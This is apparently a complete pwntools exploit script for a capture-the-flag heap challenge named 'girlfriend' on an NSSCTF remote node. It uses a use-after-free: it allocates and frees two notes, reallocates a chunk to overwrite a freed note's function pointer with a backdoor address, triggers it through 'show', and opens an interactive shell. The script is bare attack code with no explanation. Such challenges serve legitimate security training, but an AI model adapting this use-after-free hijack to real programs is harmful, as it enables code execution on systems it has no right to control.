from pwn import *

context.update(arch="amd64", os="linux", log_level="debug")
context.terminal = ["qterminal", "-e"]

#p = process("./girlfriend")
p=remote('node4.anna.nssctf.cn',28849)
backdoor = 0x400B9C
# add0
p.recvuntil(":")
sleep(0.1)
p.sendline("1")
sleep(0.1)
p.sendline("16")
p.recvuntil(":")
p.sendline("mbot")
# add1
p.recvuntil(":")
sleep(0.1)
p.sendline("1")
sleep(0.1)
p.sendline("100")
p.recvuntil(":")
p.sendline("mbot")
# del0
p.recvuntil(":")
sleep(0.1)
p.sendline("2")
sleep(0.1)
p.sendline("0")
# del1
p.recvuntil(":")
sleep(0.1)
p.sendline("2")
sleep(0.1)
p.sendline("1")
# add3
p.recvuntil(":")
sleep(0.1)
p.sendline("1")
sleep(0.1)
p.sendline("16")
p.recvuntil(":")
p.sendline(p64(backdoor))


#show
p.recvuntil(":")
sleep(0.1)
p.sendline("3")
sleep(0.1)
p.sendline("0")

p.interactive()
